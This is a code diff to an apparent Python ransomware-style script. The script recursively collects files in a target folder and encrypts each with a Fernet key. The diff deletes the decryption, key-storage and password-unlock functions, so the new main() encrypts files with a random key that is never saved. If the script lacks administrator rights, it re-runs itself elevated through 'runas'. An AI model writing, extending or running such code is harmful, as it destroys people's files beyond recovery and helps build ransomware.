@@ -4,6 +4,7 @@ import hashlib
 import os
 import random
 import string
+import sys
 
 from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
@@ -23,77 +24,6 @@ def is_admin():
         return False
 
 
-def create_key_password_based(__s_pwd: str, __b_salt: bytes = None):
-    __salt = __b_salt if __b_salt else os.urandom(16)
-    if __s_pwd:
-        __kdf = PBKDF2HMAC(
-            algorithm=hashes.SHA256(),
-            length=32,
-            salt=__salt,
-            iterations=100000,
-            backend=default_backend()
-        )
-        __key = base64.urlsafe_b64encode(__kdf.derive(__s_pwd.encode()))
-    if __s_pwd and __b_salt:
-        return __key
-    elif __s_pwd and not __b_salt:
-        return __key, __salt
-    else:
-        return __salt
-
-
-def password_unlock(user_name:str,password_given:str):
-    '''
-    :param user_name: name of the account trying to connect
-    :param password_given: Password the user gave
-    :return: boolean of the password. False if incorrect true if correct
-    '''
-    login:bool = False
-    with open('Account.txt','r') as account:
-        data = account.read()
-        found = data.find(f'Username: {user_name} password: {password_hash(password_given).hexdigest()}')
-        if found != -1:
-            print('got it')
-            login = True
-    return login
-
-
-
-
-
-
-def password_lock(password:str):
-    '''
-    :param password: the password to lock the computer
-    :return: make everything inaccessible without the password
-    '''
-    pass
-
-def password_hash(salted_password:str):
-    '''
-    :param salted_password: password+salt
-    :return: password readable
-    '''
-    return hashlib.md5(salted_password.encode())
-
-
-def account_creation(username:str,hashed_password:str):
-    file_to_oppen:str = 'Account.txt'
-    with open(file_to_oppen,'r') as txt:
-        data = txt.read()
-        print(data)
-    with open(file_to_oppen,'w') as txt:
-        txt.write(f'Username: {username} password: {hashed_password}')
-
-
-
-
-
-def key_generator():
-    '''Generate a 128 character Key'''
-    char = string.ascii_letters + string.digits + string.punctuation
-    key = ''.join(random.choice(char) for i in range(128))
-    print(key)
 
 
 def get_all_accessible_files_in_Dir(init_path:str):
@@ -182,32 +112,8 @@ def encrypt_file(file_path: str, F_key: Fernet):
             try_count += 1
 
 
-def decrypt_file(__n_key: bytes, __s_file_path: str):
-    __fernet = Fernet(__n_key)
-    with open(__s_file_path, "rb") as __file:
-        # read the encrypted data
-        __n_encrypted_data = __file.read()
-    # decrypt data
-    __n_decrypted_data = __fernet.decrypt(__n_encrypted_data)
-    # write the original file
-    with open(__s_file_path, "wb") as __file:
-        __file.write(__n_decrypted_data)
 
 
-
-def Get_Key_from_file(file_to_key:str):
-    data = ''
-    with open(file_to_key,'r') as password :
-        data = password.read()
-    data = data.strip('Key : ')
-    return Fernet(data.encode())
-
-#write the key in a file
-def key_memory(F_keys:[]):
-    pass
-    with open('Key.txt', 'w') as txt:
-        for e in F_keys:
-            txt.write(f'Key : {e.decode()}')
 
 
 
@@ -229,29 +135,15 @@ def key_memory(F_keys:[]):
 
 
 def main():
-    salt = rb'3CI\x00\x97\xdb\nr\x15\xf6\x96\xac\x98H\xe2N'
     # Look if program is admin
-    #if is_admin():
-    user = input('New username')
-    password = input('New Password')
-
-    account_creation(user,password_hash(password).hexdigest())
-
-
-    keys = []
-    files = get_all_accessible_files_in_Dir('.\\encrypt_thing')
-    own_dir = os.getcwd() # get is own directory to not encrypt itself
-    key = create_key_password_based(password,salt) # key generator
-    cipher = Fernet(key) # hash the key
-    print(f'Key : {key.decode()}')
-    for e in files:
-        if e is not own_dir:
-            encrypt_file(e, cipher) # the file it receive
-    if password_unlock(input('you want to unlock? Give me you\'re username: '),input('you want to unlock? Give me you\'re password: ')):
-        print('work')
-        #key_memory(key)
-        for e in files :
-            decrypt_file(key, e)
+    if is_admin():
+        files = get_all_accessible_files_in_Dir('.\\encrypt_thing')
+        own_dir = os.getcwd() # get is own directory to not encrypt itself
+        key = Fernet.generate_key() # key generator
+        cipher = Fernet(key) # hash the key
+        for e in files:
+            if e is not own_dir:
+                encrypt_file(e, cipher) # the file it receive
     else:
         # Re-run the program with admin rights
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
